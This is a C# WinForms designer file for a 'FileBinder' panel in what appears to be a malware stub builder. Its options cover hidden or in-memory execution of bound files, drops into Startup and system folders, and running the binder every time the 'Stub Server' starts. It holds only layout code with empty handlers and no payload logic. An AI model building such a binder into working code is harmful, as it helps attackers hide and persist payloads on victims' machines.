using System;
using System.Drawing;
using System.Windows.Forms;
using Configuration;

namespace PpRBuilder.Controls
{
    public class create_stub_FileBinder : OptionsBaseControl
    //public partial class create_stub_FileBinder : UserControl
    {
        public create_stub_FileBinder(string configName) : base(configName)
        {
            InitializeComponent();
            VistaControls.VistaConstants.SetWindowTheme(FileBinderListView.Handle, "explorer", null);
            FileBinderListView.ContextMenu = FileBinderContext;
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }
        private void FileBinder_Load(object sender, EventArgs e)
        {
            
        }
        private void AddFileButton_Click(object sender, EventArgs e)
        {

        }

        private ContextMenu FileBinderContext;
        private MenuItem menuItem3;
        private MenuItem menuItem4;
        private MenuItem menuItem1;
        private MenuItem menuItem2;
        private ColumnHeader FileNameColumn;
        private ColumnHeader OrderColumn;
        private ColumnHeader DestinationColumn;
        private ColumnHeader SizeColumn;
        private ColumnHeader TypeColumn;
        private Button button12;
        private TextBox textBox1;
        private Button AddFileButton;
        private ColumnHeader ExecutionColumn;
        private ColumnHeader ParameterColumn;
        private Label label7;
        private OpenFileDialog openFileDialog1;
        private PpRStandardLib.Controls.FullListView FileBinderListView;
        private CheckBox checkBox2;
        private TextBox textBox2;
        private Label label5;
        private ComboBox comboBox1;
        private Label label4;
        private ComboBox comboBox2;
        private Label label6;

        /// <summary> 
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.Windows.Forms.ListViewItem listViewItem1 = new System.Windows.Forms.ListViewItem(new string[] {
            "GetProdID.bat",
            "1",
            "%LocalAppData%",
            "10 KB",
            "Windows Batch File",
            "Shell Execute (Visible)",
            "/f /s /1"}, -1);
            this.FileBinderContext = new System.Windows.Forms.ContextMenu();
            this.menuItem3 = new System.Windows.Forms.MenuItem();
            this.menuItem4 = new System.Windows.Forms.MenuItem();
            this.menuItem1 = new System.Windows.Forms.MenuItem();
            this.menuItem2 = new System.Windows.Forms.MenuItem();
            this.FileNameColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.OrderColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.DestinationColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.SizeColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.TypeColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.button12 = new System.Windows.Forms.Button();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.AddFileButton = new System.Windows.Forms.Button();
            this.ExecutionColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ParameterColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.label7 = new System.Windows.Forms.Label();
            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
            this.FileBinderListView = new PpRStandardLib.Controls.FullListView();
            this.checkBox2 = new System.Windows.Forms.CheckBox();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.label4 = new System.Windows.Forms.Label();
            this.comboBox2 = new System.Windows.Forms.ComboBox();
            this.label6 = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // FileBinderContext
            // 
            this.FileBinderContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.menuItem3,
            this.menuItem4,
            this.menuItem1,
            this.menuItem2});
            // 
            // menuItem3
            // 
            this.menuItem3.Index = 0;
            this.menuItem3.Text = "Edit";
            // 
            // menuItem4
            // 
            this.menuItem4.Index = 1;
            this.menuItem4.Text = "-";
            // 
            // menuItem1
            // 
            this.menuItem1.Index = 2;
            this.menuItem1.Text = "Remove";
            // 
            // menuItem2
            // 
            this.menuItem2.Index = 3;
            this.menuItem2.Text = "Clear All";
            // 
            // FileNameColumn
            // 
            this.FileNameColumn.Text = "File Name";
            this.FileNameColumn.Width = 129;
            // 
            // OrderColumn
            // 
            this.OrderColumn.Text = "#";
            this.OrderColumn.Width = 26;
            // 
            // DestinationColumn
            // 
            this.DestinationColumn.Text = "Destination";
            this.DestinationColumn.Width = 108;
            // 
            // SizeColumn
            // 
            this.SizeColumn.Text = "Size";
            this.SizeColumn.Width = 56;
            // 
            // TypeColumn
            // 
            this.TypeColumn.Text = "Type";
            this.TypeColumn.Width = 98;
            // 
            // button12
            // 
            this.button12.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button12.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.button12.Location = new System.Drawing.Point(318, 275);
            this.button12.Name = "button12";
            this.button12.Size = new System.Drawing.Size(29, 23);
            this.button12.TabIndex = 58;
            this.button12.Text = "...";
            this.button12.UseVisualStyleBackColor = true;
            // 
            // textBox1
            // 
            this.textBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox1.BackColor = System.Drawing.SystemColors.Window;
            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.textBox1.Location = new System.Drawing.Point(0, 275);
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.Size = new System.Drawing.Size(312, 23);
            this.textBox1.TabIndex = 57;
            // 
            // AddFileButton
            // 
            this.AddFileButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.AddFileButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.AddFileButton.Location = new System.Drawing.Point(353, 275);
            this.AddFileButton.Name = "AddFileButton";
            this.AddFileButton.Size = new System.Drawing.Size(75, 23);
            this.AddFileButton.TabIndex = 0;
            this.AddFileButton.Text = "+/Update";
            this.AddFileButton.UseVisualStyleBackColor = true;
            // 
            // ExecutionColumn
            // 
            this.ExecutionColumn.Text = "Execution";
            this.ExecutionColumn.Width = 135;
            // 
            // ParameterColumn
            // 
            this.ParameterColumn.Text = "Parameter";
            this.ParameterColumn.Width = 139;
            // 
            // label7
            // 
            this.label7.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label7.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.label7.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.label7.Location = new System.Drawing.Point(0, 302);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(430, 2);
            this.label7.TabIndex = 38;
            this.label7.Text = "label7";
            // 
            // openFileDialog1
            // 
            this.openFileDialog1.FileName = "openFileDialog1";
            // 
            // FileBinderListView
            // 
            this.FileBinderListView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.FileBinderListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.FileNameColumn,
            this.OrderColumn,
            this.DestinationColumn,
            this.SizeColumn,
            this.TypeColumn,
            this.ExecutionColumn,
            this.ParameterColumn});
            this.FileBinderListView.ExplorerTheme = false;
            this.FileBinderListView.ExplorerThemeMultiSelect = false;
            this.FileBinderListView.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.FileBinderListView.FullRowSelect = true;
            this.FileBinderListView.ItemContextMenuStrip = false;
            listViewItem1.StateImageIndex = 0;
            this.FileBinderListView.Items.AddRange(new System.Windows.Forms.ListViewItem[] {
            listViewItem1});
            this.FileBinderListView.Location = new System.Drawing.Point(0, 43);
            this.FileBinderListView.LockColumnSize = false;
            this.FileBinderListView.MultiSelect = false;
            this.FileBinderListView.Name = "FileBinderListView";
            this.FileBinderListView.Size = new System.Drawing.Size(428, 227);
            this.FileBinderListView.TabIndex = 36;
            this.FileBinderListView.UseCompatibleStateImageBehavior = false;
            this.FileBinderListView.View = System.Windows.Forms.View.Details;
            // 
            // checkBox2
            // 
            this.checkBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.checkBox2.AutoSize = true;
            this.checkBox2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.checkBox2.Location = new System.Drawing.Point(0, 305);
            this.checkBox2.Name = "checkBox2";
            this.checkBox2.Size = new System.Drawing.Size(271, 19);
            this.checkBox2.TabIndex = 37;
            this.checkBox2.Text = "Execute Binder everytime the Stub Server starts";
            this.checkBox2.UseVisualStyleBackColor = true;
            // 
            // textBox2
            // 
            this.textBox2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.textBox2.Location = new System.Drawing.Point(274, 15);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(154, 23);
            this.textBox2.TabIndex = 55;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.label5.Location = new System.Drawing.Point(271, -1);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(64, 15);
            this.label5.TabIndex = 56;
            this.label5.Text = "Parameter:";
            // 
            // comboBox1
            // 
            this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] {
            "Shell Execute (Visible)",
            "Shell Execute (Hidden)",
            "Execute To Memory",
            "Extract Only"});
            this.comboBox1.Location = new System.Drawing.Point(0, 15);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(142, 23);
            this.comboBox1.TabIndex = 57;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.label4.Location = new System.Drawing.Point(-3, -1);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(61, 15);
            this.label4.TabIndex = 58;
            this.label4.Text = "Execution:";
            // 
            // comboBox2
            // 
            this.comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.comboBox2.FormattingEnabled = true;
            this.comboBox2.Items.AddRange(new object[] {
            "%HomeDrive%",
            "%AppData%",
            "%LocalAppData%",
            "%ProgramData%",
            "%ProgramFiles%",
            "%ProgramFiles%",
            "%SystemRoot%",
            "%UserProfile%",
            "%Public%",
            "%Temp%",
            "%Path%",
            "Startup Directory",
            "My Documents",
            "Stub Server Path"});
            this.comboBox2.Location = new System.Drawing.Point(148, 15);
            this.comboBox2.Name = "comboBox2";
            this.comboBox2.Size = new System.Drawing.Size(120, 23);
            this.comboBox2.TabIndex = 59;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.label6.Location = new System.Drawing.Point(145, -1);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(98, 15);
            this.label6.TabIndex = 60;
            this.label6.Text = "Extraction Folder:";
            // 
            // create_stub_FileBinder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.Controls.Add(this.button12);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.AddFileButton);
            this.Controls.Add(this.comboBox2);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.comboBox1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.FileBinderListView);
            this.Controls.Add(this.textBox2);
            this.Controls.Add(this.checkBox2);
            this.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Name = "create_stub_FileBinder";
            this.Size = new System.Drawing.Size(428, 324);
            this.Load += new System.EventHandler(this.FileBinder_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion



    }
}
